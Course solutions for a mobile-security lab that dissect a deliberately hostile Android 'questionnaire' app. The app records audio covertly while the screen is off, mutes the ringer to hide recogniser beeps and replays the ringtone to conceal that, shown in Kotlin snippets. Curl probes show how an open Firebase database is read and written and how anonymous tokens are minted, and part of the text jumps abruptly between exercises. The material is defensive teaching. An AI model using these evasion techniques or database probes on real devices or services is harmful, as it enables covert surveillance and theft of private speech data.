Hidden Recognition App — Capstone Solutions

All commands and observations are taken from Hidden Recognition App.pptx. Output captures below were taken live on the lab Galaxy A51.

Solution to Exercise 1 — Manifest red flags

aapt2 dump xmltree questionnaire.apk --file AndroidManifest.xml \
  | grep -E 'uses-permission|action android:name|foregroundServiceType|service android:name|receiver android:name'

Red-flag checklist

android.permission.RECORD_AUDIOPlausible if voice input is offered. Not plausible if the same job could be done with the system speech recogniser activity (which doesn't need this permission). The presence of this runtime permission is the first hint that the app records audio from its own code, not via Google's UI.
android.permission.RECEIVE_BOOT_COMPLETEDNo legitimate questionnaire needs to react to device boot. Single biggest red flag in the entire manifest — slide 12 explicitly identifies this as the persistence primitive.

Solution to Exercise 2 — Three stages, three observations

Reset (before stage 1)

adb uninstall com.example.questionaireapp
adb install -r questionnaire.apk            # NOTE: no -g

# verify RECORD_AUDIO is denied:
adb shell dumpsys package com.example.questionaireapp | grep RECORD_AUDIO

Captured: android.permission.RECORD_AUDIO: granted=false, flags=[ USER_SENSITIVE_WHEN_GRANTED|USER_SENSITIVE_WHEN_DENIED]

Stage 1 — Open normally, deny the permission, mic is gated

adb shell am start -n com.example.questionaireapp/.MainActivity

What students see on the phone:

  1. Questionnaire UI loads.
  2. Tap the microphone icon → Android's runtime-permission dialog: "Allow Questionnaire to record audio?"
  3. Tap Don't allow.
  4. Tap the mic again → nothing happens (the app's UI logic checks checkSelfPermission(RECORD_AUDIO), sees PERMISSION_DENIED, and refuses to launch the recogniser).

Apparent conclusion: the app is properly permission-gated, like every well-behaved Android app. Deny the permission, lose the feature. This conclusion is wrong — but it's what stage 1 is designed to make students believe.

Stage 2 — Same denied permission, bypass the app's own gate

adb shell am force-stop com.example.questionaireapp
adb shell am start -n com.example.questionaireapp/.MainActivity --ez permission false

Captured live on the A51:

$ adb shell am start -n com.example.questionaireapp/.MainActivity --ez permission false
Starting: Intent { cmp=com.example.questionaireapp/.MainActivity (has extras) }

What students see on the phone:

  1. Questionnaire UI loads as before.
  2. Tap the microphone icon → Google's full-screen voice recogniser opens immediately. No permission dialog, no "deny" toast.
  3. Speak. Recognised text fills the answer field.

Re-check the permission state:

$ adb shell dumpsys package com.example.questionaireapp | grep RECORD_AUDIO
android.permission.RECORD_AUDIO: granted=false, …

Still denied. The recognition worked anyway.

Stage 3 — Reflect: what just happened

Both runs had identical permission state — RECORD_AUDIO denied — yet the outcomes were opposite. The only thing that changed was the --ez permission false flag. Look at the relevant snippet of the app's MainActivity.kt:

companion object {
    var PART_A_FAKE_PERMISSION = true
    …
}

override fun onCreate(savedInstanceState: Bundle?) {
    …
    PART_A_FAKE_PERMISSION = intent.getBooleanExtra("permission", PART_A_FAKE_PERMISSION)
    …
}

The flag flips a static boolean used in the questionnaire's UI logic. With PART_A_FAKE_PERMISSION = true (default), the app runs its own permission check before launching the recogniser; with false, that check is skipped and the recogniser is launched directly.

The crucial part is what the recogniser actually does:

  • The app builds an Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH) and calls startActivityForResult(...).
  • Android resolves that intent to com.google.android.googlequicksearchbox (on most phones) — Google's full-screen recogniser activity.
  • That activity runs in Google's process, not ours.
  • When it opens the microphone, the OS checks RECORD_AUDIO against the Google process's UID. Google's app is a privileged/system app; it has the permission system-wide.
  • The questionnaire app is just the requester. Its UID never touches the mic on this code path.

So the app's permission check in stage 1 was theatre. The visible feature doesn't actually need RECORD_AUDIO on our app — Google does the work. The check exists purely to look normal to the user.

Then why is RECORD_AUDIO declared in the manifest at all?

Because the hidden code path — the BackgroundVoiceRecognitionService — needs it. That service uses SpeechRecognizer.createSpeechRecognizer(context) directly from our process, with no Google activity in front. Recording audio from inside our own process does require our UID to hold RECORD_AUDIO.

The user-facing UX is the cover story. The user grants RECORD_AUDIO believing it powers the questionnaire's visible mic button — which doesn't actually need it — and the same grant silently enables the real consumer of the permission, the background recording service that uploads to Firebase.

One-line summary

The permission ask is for one feature; the permission is used by another. That mismatch is the whole "Hidden Recognition" attack — the visible feature serves as a plausible explanation for a permission that the visible feature doesn't really need, while the invisible feature, which does need it, never has to justify itself to the user.

Solution to Exercise 3 — Green mic indicator and screen-off recording

What students see in stage 1 (default, screen-off-only recording)

The user finishes the questionnaire and the FGS starts. They turn the screen off, wait, then turn it back on. No green indicator appears in the status bar at any moment they can see the screen. The bar shows the FGS notification (text controlled by the app — typically something innocuous like "Clock Test running") and nothing else.

Behind the scenes:

  • BackgroundVoiceRecognitionService.onCreate registered a dynamic BroadcastReceiver for Intent.ACTION_SCREEN_ON and ACTION_SCREEN_OFF. Dynamic registration works because the FGS is alive — Android 8's static-receiver ban doesn't apply.
  • On ACTION_SCREEN_OFF → SpeechRecognizer.startListening(...). On ACTION_SCREEN_ON → SpeechRecognizer.stopListening().
  • The privacy indicator is system-UI; it only paints while the OS sees an active mic capture. By the time the user can perceive the status bar (i.e. screen on), the service has already issued stopListening.

What students see in stage 2 (--ez screen false)

adb shell am force-stop com.example.questionaireapp
adb shell am start -n com.example.questionaireapp/.MainActivity --ez screen false

This flips PART_B_RECORD_ONLY_WHEN_SCREEN_OFF to false. The screen receiver is now ignored — the service starts a recognition session and keeps it running regardless of screen state.

On the A51, after finishing the questionnaire the user sees the green privacy indicator permanently lit in the top-right of the status bar while using the phone normally. Tapping the indicator opens the system's "Privacy dashboard" sheet:

Microphone   Used by:  Clock Test (just now)

The cover collapses. Any user who notices the indicator can identify the questionnaire app as the mic consumer.

Why the screen-off rule actually works

This is one of the more elegant tricks in the deck. The privacy indicator is a system-UI defence the app cannot directly suppress — but it only matters if the user can see it. The screen being off makes the system UI invisible. Recording while the screen is off therefore costs the attacker nothing and provides total visual cover. The exception is bedside-locked phones where the user still glances at the lockscreen — which is why some defenders recommend an always-on display that includes the privacy indicator.

Reflection answer

System-UI countermeasures (privacy indicators, permission usage banners, etc.) are valuable but they're an opt-in defence — they only protect users who happen to be looking at the system UI when the misbehaviour occurs. An in-process attacker can pick the moments when no one is looking. The structurally-stronger defences are ones that withhold the capability itself, not just paint a warning when it's exercised. Android 14's BOOT_COMPLETED → microphone-FGS ban is an example of the stronger kind; the privacy indicator is the weaker kind.

Solution to Exercise 4 — Beep, mute, and the call-ring patch

Stage 1 — Hear the beep with mute disabled

adb shell am force-stop com.example.questionaireapp
adb shell am start -n com.example.questionaireapp/.MainActivity --ez beep false

Lock the screen. Within a second or two of the screen-off transition, the phone audibly emits Google's recogniser start beep. After the recognition session times out (usually a few seconds of silence) it emits the end beep. This is repeated each time the screen toggles. Anyone within earshot of the phone hears them.

This is the audio signature the user would otherwise notice: the phone is making recogniser sounds when it shouldn't be using voice for anything visible.

Stage 2 — Default mute restores silence

adb shell am force-stop com.example.questionaireapp
adb shell am start -n com.example.questionaireapp/.MainActivity

With PART_C_MUTE_BEEP_SOUND = true (default), the FGS at start-up calls:

val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
val previous = am.getStreamVolume(AudioManager.STREAM_RING)
am.setStreamVolume(AudioManager.STREAM_RING, 0, 0)

The recogniser plays its beep on STREAM_RING. Setting that stream to zero silences it. Verify live:

$ adb shell media volume --get --stream 2
volume is 0 in range [0..7]

Listening test: no beep. The student can confirm by toggling the screen and watching the FGS run.

Stage 3 — The side effect: incoming calls don't ring

adb shell am force-stop com.example.questionaireapp
adb shell am start -n com.example.questionaireapp/.MainActivity --ez call false

With PART_D_HANDEL_INCOMING_CALL = false, the call-state listener doesn't restore the ringer. With STREAM_RING at 0 from stage 2, an incoming call arrives silently — the screen lights up, vibrate may fire if the user has it enabled, but no audible ringtone plays.

This is the giveaway that defeats stage 2's silence-by-mute: a phone that suddenly stops ringing on calls is something the user will notice within a day. The app needs to paper over this side effect.

Stage 4 — Default call=true path: detect, then play ring manually

With the default, the FGS registers a PhoneStateListener (or TelephonyCallback on Android 12+) requiring READ_PHONE_STATE. On CALL_STATE_RINGING it does not just un-mute STREAM_RING (slide 24 says the un-mute would arrive too late, after the system already missed the first ring). Instead it does:

val ringtoneUri = RingtoneManager.getActualDefaultRingtoneUri(this, RingtoneManager.TYPE_RINGTONE)
val ringtone = RingtoneManager.getRingtone(this, ringtoneUri)
ringtone.play()        // plays on STREAM_MUSIC by default — ignores STREAM_RING mute

On CALL_STATE_IDLE it stops the ringtone and re-applies the STREAM_RING mute. From the user's perspective the phone rings normally; from the OS's perspective STREAM_RING is still at zero throughout (the system's ring would still be silent if it ever fired).

Cover story for the runtime permission ask: "We pause voice features during calls so they don't conflict with the call audio." The user nearly always allows it. The real reason is patching this side effect.

The two-layer pattern

Every step of this exercise is a defence layered on top of a previous defence:

  1. Layer 0: app records audio in the background → Google's recogniser beeps audibly.
  2. Layer 1: mute STREAM_RING → beep is silent → side effect: calls also silent.
  3. Layer 2: READ_PHONE_STATE + manual ringtone playback → calls audibly ring → no remaining side effect.

Each layer is justifiable in isolation. Stack them and you have a permission set the user wouldn't have agreed to as a single bundle.

The response: HTTP 200, every transcript every user has ever uploaded, structured as { <anonymous-uid>: { <timestamp>: <text> } }. The rules are open (".read": true). No auth header was sent.

This is the entire database. An attacker with only the project_id from aapt2 dump strings already has read access to every user's recorded speech.

Test write:

$ curl -sS -X POST -d '{"injection":"test"}' \
    "https://questionairapp-default-rtdb.firebaseio.com/test.json"
{"name":"-Nx9..."}

HTTP 200 with a Firebase-generated push key. Write rules are also open — the attacker can pollute, overwrite, or delete data at will. (Don't actually run the write probe against a production database you don't own. The course lab DB is intentionally permissive for demonstration.)

Stage 3 — Anonymous-auth bypass (the auth != null "fix" that isn't)

If the rules had been ".read": "auth != null" instead of true, stage 2 would have returned 401. But the API key from the APK is enough to mint an anonymous token from outside the app:

$ curl -sS -X POST \
    "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyDvi62RBr5bp4hnuN8ZyZYyYCjTd8Y5CC0" \
    -H 'Content-Type: application/json' \
    -d '{"returnSecureToken":true}'
{"kind":"…","idToken":"eyJ…long.jwt…","refreshToken":"…","expiresIn":"3600","localId":"<new-anon-uid>"}

Replay against the database with the token:

curl -sS "https://questionairapp-default-rtdb.firebaseio.com/.json?auth=eyJ…"

auth != null is satisfied — the token is genuine, signed by Google, with a fresh anonymous UID. The whole database is now accessible. The cost of this bypass is one anonymous-signup call. The "credentials" needed are public values printed inside the APK.

Slide 28's suggestion of "embed credentials in a binary library and load at runtime" is a decoy. JADX, Frida, or just strings on the .so file recovers them. The only structural defence is one of: (a) don't let the client touch the database directly, (b) bind requests to verified app instances via App Check, or (c) both.

Reflection answers

Q1 — Firebase's threat model around google-services.json. Google's docs explicitly say these are "identifiers", not "secrets". The threat model assumes the rules do all the access-control work. If the rules are open, the identifiers become credentials in everything but name. The lesson: a system that depends on a secondary configuration (rules) being correct to keep its primary configuration (identifiers) safe will eventually leak, because misconfigured rules are the dominant failure mode in any rules-based system.

Q2 — Operational habits that catch open rules pre-release. A short list that works in practice:

  • A CI step that fetches the project's rules JSON via the Firebase Admin SDK and fails the build if any rule evaluates to true at the root, or to auth != null at the root with no further constraint.
  • A code-review checklist item that requires sign-off from a second reviewer for any rules change.
  • A pre-publish test that runs the curl probe from stage 2 against the staging database — same script the attacker would run.
  • Treat the rules file as production code: it lives in a repo, gets reviewed, and gets deployed via the Firebase CLI from CI, not from a developer laptop.

Q3 — Incident response order. Probably:

  1. Lock down rules immediately: change to false at the root. Some app functionality breaks; that's a feature, not a bug, while you triage.
  2. Rotate the Firebase API key. Note that this invalidates anonymous tokens already minted but does not retroactively un-leak data.
  3. Snapshot the database for forensic analysis (who has been writing? when did the open rules go in?).
  4. Notify users. The disclosed data is recorded speech transcripts — under most jurisdictions this is highly sensitive personal information, possibly with legal notification deadlines.
  5. Migrate to App Check + server-mediated reads. Re-enable client functionality piece by piece, each piece behind App Check.

Firebase will not proactively help: there is no "open rules" alert that auto-emails you. Google has a Security Rules linter that warns at deploy time, but it doesn't block deploys.

Solution to Exercise 7 (bonus) — iOS comparison from slide 33

Three from the comparison table:

"Background recording service" — not possible on iOS

iOS only allows continuous background execution for a small enumerated list of categories (audio playback, voice-over-IP, location for navigation apps, etc.). A would-be spy app doesn't fit any of them. Tradeoff iOS makes: legitimate background-running apps for less common use cases (e.g. a science-classroom decibel meter) have to either run only while open or shoehorn themselves into one of the official categories. Less developer flexibility, less attacker capability.

"Boot completed detection" — not possible on iOS

iOS sends no boot-finished broadcast to apps; the OS doesn't even surface the concept. An iOS app can run only after the user has launched it at least once since the device booted. Tradeoff: apps that genuinely benefit from auto-restart (system tools, accessibility helpers) don't exist on iOS — Apple's stance is that users should consciously launch every app.

"Audio settings change" — not possible on iOS

iOS apps cannot change the device's ringer or media volume programmatically. The only audio control an app has is over its own playback session. Tradeoff: features like Android's "DND when in meeting" automation can't be built natively on iOS — Apple owns the audio-state UX entirely. The benefit is that no app can silence ringers behind the user's back, which is exactly what slide 23's spy app needs to do for the recogniser-beep trick.

Reflection answers

Q1 — Where would you insert an abstraction that breaks the composition? The single most leveraged primitive is the foreground-service-with-self-issued-notification model: it lets an app be alive forever in exchange for showing a notification the developer fully controls. A useful abstraction would be a system-issued notification for FGS — text, icon, and dismissibility decided by the OS, not the app — that visibly described the permission(s) the service holds. The app would lose the ability to disguise its presence as "syncing" or "playing music" while actually recording. The cost: many legitimate FGS use cases would have OS-mandated notifications they don't love (a music player would have to share notification real estate). It's a real tradeoff but the place where the most attacker leverage compounds.

Q2 — Half-life of a "few special cases" exception? Empirically, somewhere between two and three Android versions. BOOT_COMPLETED as a static-receiver exemption was supposed to be temporary in Android 8; it's still there in Android 14. Foreground services were supposed to be a narrow exception to background limits; they became the dominant way apps stay alive. The pattern is: Google announces a restriction with a short list of exceptions, the developer ecosystem migrates onto the exceptions, future tightening becomes politically expensive because it would break legitimate apps. Treat every "few special cases" line as the next decade's primary attack surface.

Q3 — Next link in the chain to close. Reasonable next target: the "user-visible state transition" exemption that lets activities start arbitrary FGS types in their onDestroy. That single exception is what lets the questionnaire's submit handler kick off the recording service — closing the screen path doesn't help if the questionnaire-finish path still works. A fix could require that any FGS started from a transitioning activity inherit a system-supplied "started by activity X" badge in its notification, plus a 5-minute timeout after which the user has to re-confirm. Breakage: music apps that start a playback FGS when you tap a song and then minimise the activity. Mitigation: an explicit "background playback" capability that apps declare in advance.

Q4 — What property of Play Store review let this through? Static review of permissions and manifest — even augmented with automated decompiled-code scans — looks at declared capability, not composed behaviour. The permission set this app declares is unusual but each individual permission has plausible legitimate uses; no single static signal is conclusive. Dynamic analysis on a running device would change the picture: instrument SpeechRecognizer initialisations and check for ones that happen with the screen off; instrument volume changes correlated with mic activity; check whether a service started from BOOT_COMPLETED ever also records audio. That's expensive (every submission needs minutes of device time) and gameable (the app could detect the analysis sandbox and behave) — which is why Google's actual play-protect system does some of this asynchronously, post-publication, with a mix of static, dynamic, and on-device telemetry signals.
